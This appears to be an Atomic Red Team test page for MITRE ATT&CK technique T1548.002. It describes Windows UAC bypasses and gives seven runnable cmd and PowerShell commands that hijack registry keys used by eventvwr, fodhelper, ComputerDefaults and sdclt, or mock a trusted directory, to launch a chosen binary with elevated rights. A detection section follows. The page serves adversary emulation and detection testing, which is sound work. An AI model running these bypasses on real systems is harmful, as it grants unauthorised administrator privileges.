# T1548.002 - Abuse Elevation Control Mechanism: Bypass User Access Control
Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)

Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)

Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Bypass UAC using Event Viewer (cmd)
Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
Upon execution command prompt should be launched with administrative privelages

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
cmd.exe /c eventvwr.msc
```

Invoke-AtomicTest T1548.002 -TestNumbers 1

### Atomic Test #2 - Bypass UAC using Event Viewer (PowerShell)
PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
Upon execution command prompt should be launched with administrative privelages

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\eventvwr.msc"
```

Invoke-AtomicTest T1548.002 -TestNumbers 2

### Atomic Test #3 - Bypass UAC using Fodhelper
Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
Upon execution, "The operation completed successfully." will be shown twice and command prompt will be opened.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe
```

Invoke-AtomicTest T1548.002 -TestNumbers 3

### Atomic Test #4 - Bypass UAC using Fodhelper - PowerShell
PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
Upon execution command prompt will be opened.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

Invoke-AtomicTest T1548.002 -TestNumbers 4

### Atomic Test #5 - Bypass UAC using ComputerDefaults (PowerShell)
PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
Upon execution administrative command prompt should open

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```

Invoke-AtomicTest T1548.002 -TestNumbers 5

### Atomic Test #6 - Bypass UAC by Mocking Trusted Directories
Creates a fake "trusted directory" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems
Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
mkdir "\\?\C:\Windows \System32\"
copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
```

Invoke-AtomicTest T1548.002 -TestNumbers 6

### Atomic Test #7 - Bypass UAC using sdclt DelegateExecute
Bypasses User Account Control using a fileless method, registry only. 
Upon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe
[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)
Adapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command.to.execute}'
New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3
```

Invoke-AtomicTest T1548.002 -TestNumbers 7

## Detection
There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.

Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:

* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)

* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> and <code>[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)

Analysts should monitor these Registry settings for unauthorized changes.